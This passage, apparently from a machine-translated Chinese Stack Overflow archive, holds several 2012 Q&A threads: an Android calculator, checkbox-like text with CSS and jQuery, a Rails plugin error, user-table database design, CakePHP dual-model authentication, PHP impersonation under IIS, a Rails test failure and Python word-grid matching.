如果`NSRegularExpressions`没有一些方便的方法，我无法想象否则怎么可能。想想看`^`。当它在字符类之外时，它是一个可以忽略的元字符。如果它在字符类中，它是一个元字符，它否定字符类**，除非**它不是第一个字符。`-`是字符类中的元字符，除非它是第一个字符、最后一个字符或紧随另一个字符范围（取决于正则表达式的风格）。而且我什至没有谈论转义字符。

我不知道`NSRegularExpressions`，但有些风格还支持嵌套字符类（如`[a-z[^aeiou]]`所有辅音）。我想你明白了我的意思。**

# java - 试图在android应用程序中为计算器做计算代码

> ID：13167355
> 
> 赞同：0
> 
> 时间：2012-10-31T21:00:56.087
> 
> 标签：java, android, eclipse, calculator

我正在尝试在 android 中对计算器应用程序进行排序。我的布局设置得很好，现在我只需要执行将计算的代码。应用程序需要在按下时显示数字，然后如果说按下 + 按钮，它将存储第一个数字，将其从屏幕上清除，获取第二个数字，然后将它们相加。当按下相等按钮时，它需要显示结果。

到目前为止我有

```
public class Calculator extends Activity {

    public EditText display;  
    TextView screen;
    int a, result;
    int c;
    Button b1;
    int sum1, sum2;
    String r;

    public int getSum1(int sum1) {
        return sum1;
    }

    public int getSum2(int sum2) {
        return sum2;
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);  

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    public void buttonEventHandler(View v) {
        screen=(EditText)findViewById(R.id.screen);
        b1=(Button)findViewById(R.id.button1);
        switch(v.getId()) {

        case R.id.button1 :
            screen.setText(screen.getText() + "1");
            c = +1;
            break;

        case R.id.button2 : 
            screen.setText(screen.getText() + "2");
            c = +2;
            break;

        case R.id.button3 : 
            screen.setText(screen.getText() + "3");
            c = +3;
            break;

        case R.id.button4 : 
            screen.setText(screen.getText() + "4");
            c = +4;
            break;

        case R.id.button5 : 
            screen.setText(screen.getText() + "5");
            c = +5;
            break;

        case R.id.button6 : 
            screen.setText(screen.getText() + "6");
            c = +6;
            break;

        case R.id.button7 : 
            screen.setText(screen.getText() + "7");
            c = +7;
            break;

        case R.id.button8 : 
            screen.setText(screen.getText() + "8");
            c = +8;
            break;

        case R.id.button9 : 
            screen.setText(screen.getText() + "9");
            c = +9;
            break;

        case R.id.button0 : 
            screen.setText(screen.getText() + "0");
            c = +0;
            break;

        case R.id.buttonC :
            screen.setText(screen.getText() + "");
            c = 0;
            break;

        case R.id.buttonPlus :          

        case R.id.buttonEquals :

        }

    }
} 
```

如何进行计算？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:08:02.913

这是一个相当负荷的问题。根据您想要进行的计算数量，它可能会变得更加复杂。会被限制`x + y`吗？或者您是否希望允许类似的事情`3 * (4 + 5) / 6 + 3`？

后者会使事情变得更加复杂，可能需要您以`tree`某种形式实现数据类型。这是我在谷歌上找到的一个讨论：[http ://www.javaprogrammingforums.com/algorithms-recursion/605-java-calculator.html](http://www.javaprogrammingforums.com/algorithms-recursion/605-java-calculator.html)

如果您要使用前者，则需要允许`+`将 的当前值存储`c`到数据类型中，然后清除屏幕并重置`c`为 0。一旦`=`按下，它将评估总和并将其报告回屏幕。一定要包括任何检查以确保没有值是空的。

有关您的意图和计划的更多详细信息可能有助于我和其他人了解您的项目范围。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:10:22.317

将您`sum1`的设置为零`onCreate`。当用户点击`+`时，执行：

1.  添加`c`到`sum1`
2.  展示`sum1`
3.  重置`c`为零，以便可以输入新数字

当用户点击`=`时，执行：

1.  添加`c`到`sum1`
2.  展示`sum1`
3.  重置`c`和`sum1`归零

例如，这允许您点击`4 + 5 + 6 =`并查看`15`。

# html - 使文本像一个复选框

> ID：13167356
> 
> 赞同：1
> 
> 时间：2012-10-31T21:01:06.270
> 
> 标签：html, css

我正在设置一个表单，是否可以使文本字符串像一个复选框一样，例如在单击时突出显示它，而不实际显示复选框？

编辑：

```
<script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript">    </script>
<script type="text/javascript">
$(function(){
    $('.fake-check').on('click',function(){
      if($(this).hasClass('checked')){
        $(this).removeClass('checked').children('input').val('');
      }else{
        $(this).addClass('checked').children('input').val($(this).data('val'));
      }
    });
});
</script>

<link href="test.css" rel="stylesheet" type="text/css" />
<a class="fake-check" data-val="somevalue">Something<input type="text"   name="somefield"></a> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:06:40.047

是的，给定以下 HTML：

```
​&lt;input type="checkbox" id="test" /><label for="test">Click to check</label>​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

和CSS：

```
​label {
    color: #f00;
}

input {
    display: none;
}

input[type=checkbox]:checked + label {
    color: #0f0;
}
​ 
```

```
label {
  color: #f00;
}
input {
  display: none;
}
input[type=checkbox]:checked + label {
  color: #0f0;
}
```

```
<input type="checkbox" id="test" checked/>
<label for="test">Click to check</label>
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/7rmmu/)。

当然，这取决于实现`:checked`伪类的浏览器。

我使用了属性等于符号来指定检查后的`label`元素，但由于只能选择或，因此*可以*安全地省略该特异性。`input``type="checkbox"``checkbox``radio`

 *您还可以在兼容的浏览器中使用与`::after`伪元素及其`content`属性一致的相同方法，更改文本以反映复选框的状态。例如，使用以下 HTML：

```
​&lt;input type="checkbox" id="test" /><label for="test">Click to</label>​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

和CSS：

```
​label {
    color: #f00;
}

input {
    display: none;
}

input[type=checkbox]:checked + label {
    color: #0f0;
}

input[type=checkbox] + label::after {
    content: ' check';
}

input[type=checkbox]:checked + label::after {
    content: ' uncheck';
}
​ 
```

```
label {
  color: #f00;
}
input {
  display: none;
}
input[type=checkbox]:checked + label {
  color: #0f0;
}
input[type=checkbox] + label::after {
  content: ' check';
}
input[type=checkbox]:checked + label::after {
  content: ' uncheck';
}
```

```
<input type="checkbox" id="test" checked/>
<label for="test">Click to</label>
```

参考：

*   [相邻兄弟 ( `+`) 组合](http://www.w3.org/TR/selectors/#adjacent-sibling-combinators)子。
*   [`::before``::after` 伪元素](http://www.w3.org/TR/CSS21/generate.html#before-after-content)。
*   [`:checked`伪类](http://www.w3.org/TR/selectors/#checked)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:04:34.293

你可以使用 jQuery 并且很容易地做到这一点：

HTML：

```
<a class="fake-check" data-val="somevalue">
    Something
    <input type="hidden" name="somefield">
</a> 
```

CSS：

```
.checked { background: red; } 
```

JavaScript：

```
$('.fake-check').on('click',function(){
  if($(this).hasClass('checked')){
      $(this).removeClass('checked').children('input').val('');
  }else{
      $(this).addClass('checked').children('input').val($(this).data('val'));
  }
}); 
```

这是小提琴：http: [//jsfiddle.net/vZVNC/](http://jsfiddle.net/vZVNC/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T21:06:01.573

这将有效，但仅适用于 CSS3 浏览器：

```
<input type="checkbox" id="a" name="a" class="hideMe"> ​&lt;label for="a">Something</label> 
```

​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ ​​​​​​​</p>

```
.hideMe {
    height:0;
    width:0;
    visibility:hidden;   
}    

input:checked + label {
    background-color:#e0e0e0
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:08:53.237

**试试这个代码**

```
<html>
    <head>
    <title>Untitled Document</title>

    <script type="text/javascript">
    var is_highlighted = false;
    function textclicked(text){
        if(is_highlighted == false){
            text.style.background = '#FFFF99';
            is_highlighted = true;
        }
        else{
            text.style.background = 'none';
            is_highlighted = false;
        }

    }
    </script>
    </head>

    <body>
    <a style="cursor:pointer;" onclick="javascript:textclicked(this)">some text which act like checkbox</a>
    </body>
    </html> 
```*

# javascript - 带有两侧多选 jquery 插件的 Rails，奇怪的错误

> ID：13167357
> 
> 赞同：0
> 
> 时间：2012-10-31T21:01:09.333
> 
> 标签：javascript, jquery, ruby-on-rails

我在这里使用jquery插件“双面多选”：http: [//www.stevefenton.co.uk/cmsfiles/assets/File/twolateralmultiselect.html](http://www.stevefenton.co.uk/cmsfiles/assets/File/twosidedmultiselect.html)

使用以下代码使用常规 rails 助手成功显示常规多选框：

```
<%= f.select(:expertise1, Tag.all.collect {|tag| [ tag.value, tag.value ] }, {}, {multiple: true, class: "multiselect"}) %> 
```

我在资产的 javascripts 文件夹中有 jquery.twolateralmultiselector.js 文件，并在页面源代码中查看它。必须加载 Jquery，因为它在所有地方都使用它（rails 3.2.8），并且在源代码中可见。(1.8.2)

但是，当我将此添加到 javascript 时（在 $(document).ready(function() 内）：

```
 $(".multiselect").twosidedmultiselect(); 
```

我在 javascript 控制台中收到此错误，我完全不知道它的含义以及如何解决它：

```
Uncaught TypeError: Object [object Object] has no method 'twosidedmultiselect' 
```

帮助！！非常感谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-31T21:24:42.137

将您的 javascript 包含在**DOM Ready 处理程序**中，这应该可以解决问题

```
$(function() {
     // This is the only line you need for the plugin
     $(".multiselect").twosidedmultiselect();

    // The below script is for information / example...

    // How to get the current selected items (note, they won't always have 
    // a "selected" attribute, but they will be in the box with the original ID:

    var selectedOptions = $("#yourselect")[0].options;

}); 
```

您似乎在元素完全加载之前使用了插件。在 DOM 处理程序中编写代码应该可以解决您的问题

# mysql - （有点）复杂的数据库结构与简单的 - 带有空字段

> ID：13167365
> 
> 赞同：4
> 
> 时间：2012-10-31T21:01:50.003
> 
> 标签：mysql, database, database-design, database-schema

我目前正在两种不同的数据库设计之间进行选择。一种**复杂**的可以更好地**分离数据**，而不是更简单的一种。更复杂的设计需要更**复杂的查询**，而**更简单**的设计需要几个**`null`字段**。

考虑以下示例：

**复杂：**

![复杂](../Images/42f8863f5c08aa42a0ca835d33b507d6.png)

**更简单：**

![更简单](../Images/970e20a30638f2e42a411e6a02920d50.png)

上述示例用于区分普通用户和 Facebook 用户（他们最终将访问相同的数据，但登录方式不同）。在第一个示例中，数据明显分开。第二个例子更简单，但每行至少有一个`null`字段。`facebookUserId`如果是普通用户，则为空，而`username`如果`password`是 Facebook 用户，则为空。

我的问题是：**什么是首选**？优点缺点？随着时间的推移，哪一个最容易维护？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T09:41:59.533

首先，柯克说了什么。它很好地总结了每种替代设计的可能后果。其次，值得了解其他人在相同问题上做了什么。

您概述的案例在 ER 建模界被称为“ER 专业化”。ER 专业化只是子类概念的不同措辞。您展示的图表是在 SQL 表中实现子类的两种不同方式。第一个名为“类表继承”。第二个名称为“单表继承”。

如果您确实使用类表继承，您将需要应用另一种技术，该技术名为“共享主键”。在这种技术中，facebookusers 和 normalusers 的 id 字段将是来自用户的 id 字段的副本。这有几个优点。它加强了关系的一对一性质。它在子类表中保存了一个额外的外键。它会自动提供使连接运行得更快所需的索引。并且它允许一个简单的简单连接，将专用数据和通用数据放在一起。

您可以在 SO 中查找“ER 专业化”、“单表继承”、“类表继承”和“共享主键”作为标签。或者您可以在网上搜索相同的主题。您将学到的第一件事是柯克总结得很好。除此之外，您将学习如何使用每种技术。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T22:34:01.730

这取决于您使用的数据库。例如，Postgres 具有对您的示例非常有用的表继承，请看这里： [http ://www.postgresql.org/docs/9.1/static/tutorial-inheritance.html](http://www.postgresql.org/docs/9.1/static/tutorial-inheritance.html)

现在，如果您没有表继承，您仍然可以创建视图来简化查询，因此“复杂”示例在这里是一个可行的选择。现在，如果您有无限的时间，那么我会选择第一个（对于这个简单的示例，并且首选表继承）。

但是，这会使事情变得更加复杂，因此会花费您更多的时间来实施和维护。如果您有许多这样的表层次结构，它也会对性能产生影响（因为您必须连接许多表）。我曾经开发过一个过度使用这种层次结构的数据库模式（在概念上）。我们最终决定在概念上保留层次结构，但在实现中扁平化层次结构，因为它变得如此复杂以至于不再可维护。

当您扁平化层次结构时，您可能会考虑不使用`null`值，因为这也可以证明使事情变得更加困难（或者您可以使用 a`-1`或其他东西）。

希望这些想法对你有帮助！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-31T23:46:55.837

好问题。

这适用于您可能选择实现的任何抽象，无论是在代码中还是在数据库中。你会为 Facebook 用户和“普通”用户编写一个单独的类，还是在一个类中处理这两种情况？

第一个选项更复杂。为什么复杂？因为它更具扩展性。您可以轻松地包含其他身份验证方法（例如 Twitter ID 表），或扩展 Facebook 表以包含...一些其他 Facebook 特定信息。您已将特定于每种身份验证方法的信息提取到其自己的表中，从而使每种方法都独立存在。这很棒！

权衡是查询需要更多的努力，选择和插入需要更多的努力，而且可能会更混乱。您不希望有十几个表用于十几种不同的身份验证方法。除非您从中获得一些好处，否则您并不真的想要两个表用于两种身份验证方法。你需要这种灵活性吗？身份验证方法都相似——它们都有用户名和密码。这种抽象让您可以存储更多特定于方法的信息，但这些信息是否存在？

第二种选择与第一种相反。更简单，但是您将如何处理未来的身份验证方法以及如果您需要添加一些身份验证方法特定的信息怎么办？

我个人会尝试评估此身份验证组件对系统的重要性。记住 YAGNI -*你不会需要它*- 不要过度设计。除非您需要第一个选项提供的可扩展性，否则请选择第二个。如有必要，您可以随时提取它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-31T23:40:17.853

两个非常相似的表 facebookusers 和 normalusers 的存在，警钟响亮。如果你得到第三种类型怎么办？还是第十名？疯了吧，

应该有一个带有属性列的用户表来显示用户的类型。一个用户就是一个用户。

尽可能保持数据模型*简单*。不要通过数据结构构建太多功夫。将其留给应用程序，这比更改数据库要容易得多！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-02T05:45:18.220

让我敢建议第三个。您可以引入 1 个（或 2 个）表来满足可扩展性。我个人尽量避免会引入（阅读：污染）具有非统一适用列的实体模型的设计。让第三个表（在[EAV 模型](http://techportal.inviqa.com/2010/10/21/the-eav-data-model/)之后）包含与您的用户表的多对一关系，以适应多/可变用户相关字段。

我不确定您当前/短期的需求是什么，但是重新设计您的应用程序以迎合 Twitter 或linkedIn 用户可能会很痛苦。如果您可以`facebookUserId`像这样将列的内容抽象为属性表

```
 user_attr{
 id PK
 user_id FK
 login_id
  } 
```

现在，上述定义足以满足您当前的需求。如果操作正确，EAV 应该看起来更像这样：

```
 user_attr{
 id PK
 user_id FK
 login_id
 login_id_type FK
 login_id_status //simple boolean flag to set the validity of a given login
  } 
```

`login_id_type`列出您当前支持的各种登录类型的属性表的外键在哪里。这为您和您的用户提供了灵活性，因为您的用户可以使用不同的外部服务进行多次登录，而无需更改大部分现有系统

# authentication - CakePHP 2.x Auth 与两个单独的登录

> ID：13167367
> 
> 赞同：12
> 
> 时间：2012-10-31T21:01:51.090
> 
> 标签：authentication, login, cakephp-2.1

早在五月份，我就发布了[这个问题](https://stackoverflow.com/questions/10739402/cakephp-auth-component-possible-to-have-two-separate-logins)。我试图在不同的应用程序上再次做同样的事情，但我还没有找到解决这个问题的方法。我确实有更多的信息和更好的代码，所以我希望你们能帮助我解决这个问题。

用例：医生办公室有一个包含管理员用户的网站。`User`用户通过模型和.CakePHP 的 Auth 成功登录`UsersController`。

医生有完全不同的个人资料和行动的转诊医生。医生需要通过 登录`example.com/physicians/login`。但是，此登录失败

`authError => 'You are not authorized to access that location.'`

这是我的代码`AppController`：

```
class AppController extends Controller {
public $helpers = array('Form', 'Html', 'Time', 'Session', 'Js' => array('Jquery')); 

public $components = array(
    'Session',
    'Auth' => array(
        'autoRedirect' => false,
        'authorize' => 'Controller'
    )
);

public function beforeFilter() {
    $this->Auth->allow('index', 'view', 'edit', 'display', 'featured', 'events', 'contact', 'signup', 'search', 'view_category', 'view_archive', 'addComment', 'schedule', 'login');
} 
```

}

这是我`UsersController`的工作：

```
class UsersController extends AppController {

public $components = array(
    'Auth' => array(
        'authenticate' => array(
            'Form' => array(
                'userModel' => 'User',
                'fields' => array(
                    'username' => 'username',
                    'password' => 'password'
                )
            )
        ),
        'loginRedirect' => array('controller' => 'users', 'action' => 'admin'),
        'logoutRedirect' => array('controller' => 'pages', 'action' => 'index'),
        'loginAction' => array('controller' => 'users', 'action' => 'login'),
        'sessionKey' => 'Admin'
    )
);

public function beforeFilter() {
    parent::beforeFilter();
    $this->Auth->allow('add', 'login', 'logout');
}

function isAuthorized() {
    return true;
}

public function login() {
    if ($this->request->is('post')) {
        if ($this->Auth->login()) {
            $this->redirect($this->Auth->redirect());
        } else {
            $this->Session->setFlash(__('Invalid username or password, try again'));
        }
    }
}

public function logout() {
    $this->Session->destroy();
    $this->redirect($this->Auth->logout());
} 
```

这是我的`PhysiciansController`代码不起作用：

```
class PhysiciansController extends AppController {

public $components = array(
    'Auth' => array(
        'authenticate' => array(
            'Form' => array(
                'userModel' => 'Physician',
                'fields' => array(
                    'username' => 'username',
                    'password' => 'password'
                )
            )
        ),
        'loginRedirect' => array('controller' => 'physicians', 'action' => 'dashboard'),
        'logoutRedirect' => array('controller' => 'pages', 'action' => 'index'),
        'loginAction' => array('controller' => 'physicians', 'action' => 'login'),
        'sessionKey' => 'Physician'
    )
);

public function beforeFilter() {
    parent::beforeFilter();

    $this->Auth->authorize = array(
        'Actions' => array(
            'userModel' => 'Physician',
            'actionPath' => 'physicians'
        )
    );

    $this->Auth->allow('login', 'logout');
// $this->Session->write('Auth.redirect','/physicians/index');
}

function isAuthorized() {   
    return true;    
}   

public function login() {
    if ($this->request->is('post')) {
        if ($this->Auth->login()) {
            $this->redirect(array('controller' => 'physicians', 'action' => 'dashboard'));
        } else {
            $this->Session->read();
            debug($this->Auth);
            $this->Session->setFlash(__('Invalid username or password, try again'));
        }
    }
}

public function logout() {
    $this->Session->destroy();
    $this->redirect($this->Auth->logout());
} 
```

我真的不想重新开始并切换到 ACL —— 我不确定这对于两次登录是否是必要的。非常感谢您的帮助！

编辑：Joshua 在下面的回答很棒而且非常有帮助。我实现了它，但是当我尝试通过/phys/physican/login（前缀/控制器/操作）以医师身份登录时，我仍然收到未经授权的错误。管理员设置效果很好。这是我尝试登录时的调试代码：

```
object(AuthComponent) {
    components => array(
    (int) 0 => 'Session',
    (int) 1 => 'RequestHandler'
)
authenticate => array(
    'Form' => array(
        'userModel' => 'Physician'
    )
)
authorize => false
ajaxLogin => null
flash => array(
    'element' => 'default',
    'key' => 'auth',
    'params' => array()
)
loginAction => array(
    'controller' => 'physicians',
    'action' => 'phys_login'
)
loginRedirect => null
logoutRedirect => '/'
authError => 'You are not authorized to access that location.'
allowedActions => array()
request => object(CakeRequest) {
    params => array(
        'prefix' => '*****',
        'plugin' => null,
        'controller' => 'physicians',
        'action' => 'phys_login',
        'named' => array(),
        'pass' => array(),
        'phys' => true,
        '_Token' => array(
            'key' => 'ad1ea69c3b2c7b9e833bbda03ef18b04079b23c3',
            'unlockedFields' => array()
        ),
        'isAjax' => false
    )
    data => array(
        'Physician' => array(
            'password' => '*****',
            'username' => 'deewilcox'
        )
    )
    query => array()
    url => 'phys/physicians/login'
    base => ''
    webroot => '/'
    here => '/phys/physicians/login'
}
response => object(CakeResponse) {

}
settings => array() 
```

}

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-10-31T22:07:17.570

好的，我有办法做到这一点。你知道前缀路由吗？如果没有，请在此处阅读我的答案：[CakePHP/MVC 管理函数放置](https://stackoverflow.com/questions/11324158/cakephp-mvc-admin-functions-placement/11324496#11324496)该答案描述了如何设置单个路由前缀（'admin'）。但是你可以有任何数字——就像这样：

```
Configure::write('Routing.prefixes', array('admin','phys','member','user'));
// now we have admin, phys, member and user prefix routing enabled. 
```

你可以做的是让所有医生的方法都使用'admin'前缀路由，所有医生方法都使用'phys'前缀路由。

所以下面是我很快就破解的代码，所以它可能并不完美，但它应该显示这个概念。这是应用程序控制器的前置过滤器方法的伪代码：

```
if (USER IS TRYING TO ACCESS AN ADMIN PREFIXED METHOD) {
    Then use the users table for auth stuff
} else if (USER IS TRYING TO ACCESS A PHYS PREFIXED METHOD) {
    Then use the physicians table for auth stuff
} else {
    It's neither an admin method, not a physicians method. So just always allow access. Or always deny access - depending on your site
} 
```

这是我的应用程序控制器代码：

```
App::uses('Controller', 'Controller');

class AppController extends Controller {

    public $components = array('Security','Cookie','Session','Auth','RequestHandler');
    public $helpers = array('Cache','Html','Session','Form');

    function beforeFilter() {

        if ($this->request->prefix == 'admin') {
            $this->layout = 'admin';
            // Specify which controller/action handles logging in:
            AuthComponent::$sessionKey = 'Auth.Admin'; // solution from https://stackoverflow.com/questions/10538159/cakephp-auth-component-with-two-models-session
            $this->Auth->loginAction = array('controller'=>'administrators','action'=>'login');
            $this->Auth->loginRedirect = array('controller'=>'some_other_controller','action'=>'index');
            $this->Auth->logoutRedirect = array('controller'=>'administrators','action'=>'login');
            $this->Auth->authenticate = array(
                'Form' => array(
                    'userModel' => 'User',
                )
            );
            $this->Auth->allow('login');

        } else if ($this->request->prefix == 'phys') {
            // Specify which controller/action handles logging in:
            AuthComponent::$sessionKey = 'Auth.Phys'; // solution from https://stackoverflow.com/questions/10538159/cakephp-auth-component-with-two-models-session
            $this->Auth->loginAction = array('controller'=>'users','action'=>'login');
            $this->Auth->logoutRedirect = '/';

            $this->Auth->authenticate = array(
                'Form' => array(
                    'userModel' => 'Physician',
                )
            );
        } else {
            // If we get here, it is neither a 'phys' prefixed method, not an 'admin' prefixed method.
            // So, just allow access to everyone - or, alternatively, you could deny access - $this->Auth->deny();
            $this->Auth->allow();           
        }
    }

    public function isAuthorized($user){
        // You can have various extra checks in here, if needed.
        // We'll just return true though. I'm pretty certain this method has to exist, even if it just returns true.
        return true;
    }

} 
```

注意这些行：

```
AuthComponent::$sessionKey = 'Auth.Admin'; // solution from https://stackoverflow.com/questions/10538159/cakephp-auth-component-with-two-models-session 
```

和

```
AuthComponent::$sessionKey = 'Auth.Phys'; // solution from https://stackoverflow.com/questions/10538159/cakephp-auth-component-with-two-models-session 
```

这样做是允许一个人在一个浏览器中同时作为医生和管理员登录，而不会干扰彼此的会话。您可能在实时站点中不需要它，但在测试时它肯定很方便。

现在，在您各自的控制器中，您将需要带有适当前缀的直接登录/注销方法。

因此，对于管理员前缀，在您的用户控制器中：

```
public function admin_login() {
    if ($this->request->is('post')) {
        if ($this->Auth->login()) {
            return $this->redirect($this->Auth->redirect());
        } else {
            $this->Session->setFlash(__('Username or password is incorrect'), 'default', array(), 'auth');
        }
    }
}

public function admin_logout() {
    $this->Session->setFlash('Successfully Logged Out');
    $this->redirect($this->Auth->logout());
} 
```

在您的医生控制器中：

```
public function phys_login() {
    if ($this->request->is('post')) {
        if ($this->Auth->login()) {
            return $this->redirect($this->Auth->redirect());
        } else {
            $this->Session->setFlash(__('Username or password is incorrect'), 'default', array(), 'auth');
        }
    }
}

public function phys_logout() {
    $this->Session->setFlash('Successfully Logged Out');
    $this->redirect($this->Auth->logout());
} 
```

就像我说的，我很快就将所有代码拼凑在一起，所以它可能无法逐字运行，但它应该显示这个概念。如果您有任何问题，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-25T06:21:14.303

代替

```
$this->Session->write('Auth.redirect','/physicians/index'); 
```

你应该使用

```
setcookie("keys", value); 
```

# c# - PHP中的Windows用户模拟？

> ID：13167369
> 
> 赞同：1
> 
> 时间：2012-10-31T21:01:55.140
> 
> 标签：c#, php, iis

我的任务是升级我们公司的网站，以便将其迁移到新机器上。我们网站的用户使用登录页面登录，我在 IIS 中添加了一个模块来拦截请求，以便设置正确的 cookie 和安全令牌以进入网站。在早期版本中，我们使用 C++ 中的 ISAPI 脚本，但由于它在我们的新机器上不起作用，我不得不编写这个新的 IIS 模块。

现在，Web 用户被映射到 Web 服务器上的 Windows 帐户，以允许或拒绝访问文件系统资源（主要是图像和视频）。映射在我们的数据库中。

在网站的 php 页面中，提到了 $REMOTE_USER，这是猜测处理 Web 请求的 Windows 帐户。IIS 将默认帐户分配给请求，但我想在不同的凭据下运行请求。换句话说，如果 ClientOne 登录到该网站并且他已映射到 NT 帐户 UsrRestricted，我希望请求运行就像 UsrRestricted 正在运行节目，而不是 IIS 默认值，我认为是 IUSR。

那么如何设置一个代表谁执行以下请求的 Windows 帐户呢？我已经阅读了 ASP.net 模拟，我认为这可能是一个解决方案，但它会延续到 PHP 中的服务器代码吗？

*我当然是 PHP 和 IIS 的新手，并感谢任何提示。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:23:46.537

您可能正在使用 fast-cgi 在 iis 中运行 php。

您可以通过设置 fast-cgi 来模拟客户端凭据

```
fastcgi.impersonate = 1 
```

在 php.ini 中。

# ruby-on-rails - 我应该怎么做才能使这个 Rails 应用程序可测试？

> ID：13167373
> 
> 赞同：1
> 
> 时间：2012-10-31T21:02:20.380
> 
> 标签：ruby-on-rails, ruby, tdd, activesupport

我有一个最新的 rails 应用程序，使用带有 mongoid 2 的 rails 3.2。我无法通过键入 rake 开始测试。抛出的异常是（已清理）：

```
rake test                                                                                                                         
/railsapp/app/models/image.rb:18:in `<class:Image>': undefined method `[]' for nil:NilClass (NoMethodError)
    from /railsapp/app/models/image.rb:1:in `<top (required)>'
    from /gems/activesupport-3.2.8/lib/active_support/dependencies.rb:251:in `require'
    from /gems/activesupport-3.2.8/lib/active_support/dependencies.rb:251:in `block in require'
    from /gems/activesupport-3.2.8/lib/active_support/dependencies.rb:236:in `load_dependency'
    from /gems/activesupport-3.2.8/lib/active_support/dependencies.rb:251:in `require'
    from /gems/activesupport-3.2.8/lib/active_support/dependencies.rb:359:in `require_or_load'
    from /gems/activesupport-3.2.8/lib/active_support/dependencies.rb:313:in `depend_on'
    from /gems/activesupport-3.2.8/lib/active_support/dependencies.rb:225:in `require_dependency'
    from /gems/railties-3.2.8/lib/rails/engine.rb:439:in `block (2 levels) in eager_load!'
    from /gems/railties-3.2.8/lib/rails/engine.rb:438:in `each'
    from /gems/railties-3.2.8/lib/rails/engine.rb:438:in `block in eager_load!'
    from /gems/railties-3.2.8/lib/rails/engine.rb:436:in `each'
    from /gems/railties-3.2.8/lib/rails/engine.rb:436:in `eager_load!'
    from /gems/railties-3.2.8/lib/rails/application/finisher.rb:53:in `block in <module:Finisher>'
    from /gems/railties-3.2.8/lib/rails/initializable.rb:30:in `instance_exec'
    from /gems/railties-3.2.8/lib/rails/initializable.rb:30:in `run'
    from /gems/railties-3.2.8/lib/rails/initializable.rb:55:in `block in run_initializers'
    from /gems/railties-3.2.8/lib/rails/initializable.rb:54:in `each'
    from /gems/railties-3.2.8/lib/rails/initializable.rb:54:in `run_initializers'
    from /gems/railties-3.2.8/lib/rails/application.rb:136:in `initialize!'
    from /gems/railties-3.2.8/lib/rails/railtie/configurable.rb:30:in `method_missing'
    from /railsapp/config/environment.rb:7:in `<top (required)>'
    from /railsapp/test/test_helper.rb:2:in `require'
    from /railsapp/test/test_helper.rb:2:in `<top (required)>'
    from /railsapp/test/unit/post_test.rb:1:in `require'
    from /railsapp/test/unit/post_test.rb:1:in `<top (required)>'
    from /gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:10:in `require'
    from /gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:10:in `block (2 levels) in <main>'
    from /gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:9:in `each'
    from /gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:9:in `block in <main>'
    from /gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:4:in `select'
    from /gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:4:in `<main>'
Errors running test:units! #<RuntimeError: Command failed with status (1): [/Users/janlimpens/.rvm/rubies/ruby-1.9.3-p...]> 
```

我用上下文中感兴趣的文件创建了一个要点： [https ://gist.github.com/3989760](https://gist.github.com/3989760)

根本没有关于图像模型的测试，没有固定装置，我得到的唯一测试包含在要点中，但这不是罪魁祸首，错误是在包含 test_helper.rb 时引发的。

我有哪些选择？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:19:36.853

当测试开始 Rails 加载时，它会评估所有模型。

这包括 Image 模型，它在第 18 行显然有一个错误或错字。

这将是这一行：

```
:path => "#{APP_CONFIG['uploads_dir']}/:class/:id/:attachment/:style.:extension", 
```

这里唯一的数组表示法是：

```
APP_CONFIG['uploads_dir'] 
```

那么，APP_CONFIG 是在哪里定义的呢？为什么它是零？这些都是我们必须回答的问题。

您可以从 grepping 您的项目中获取此字符串开始。

# python - Python 列表比较

> ID：13167377
> 
> 赞同：-1
> 
> 时间：2012-10-31T21:02:49.747
> 
> 标签：python, python-3.x

我在完成家庭作业时遇到了困难。我正在尝试确定单词列表是否包含在字符列表中。

例如：

```
([['A', 'N', 'T', 'T'], ['X', 'S', 'O', 'B']], ['ANT', 'BOX', 'SOB', 'TO']) 
```

我正在尝试确定单词列表在其他两个列表中出现的次数。(它应该返回 3)('ANT', "SOB', and 'TO')

第一个列表最终会像这样显示：（是的，它读取列和行中的单词）

```
ANTT
XSOB 
```

稍后会有两个以上的列表。

我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:10:47.173

您可以从行和列生成字符串：

```
In [1]: data = ([['A', 'N', 'T', 'T'], ['X', 'S', 'O', 'B']], ['ANT', 'BOX', 'SOB', 'TO'])

In [2]: rows = [''.join(s) for s in data[0]]

In [3]: rows
Out[3]: ['ANTT', 'XSOB']

In [4]: cols = [''.join(s) for s in zip(*data[0])]

In [5]: cols
Out[5]: ['AX', 'NS', 'TO', 'TB'] 
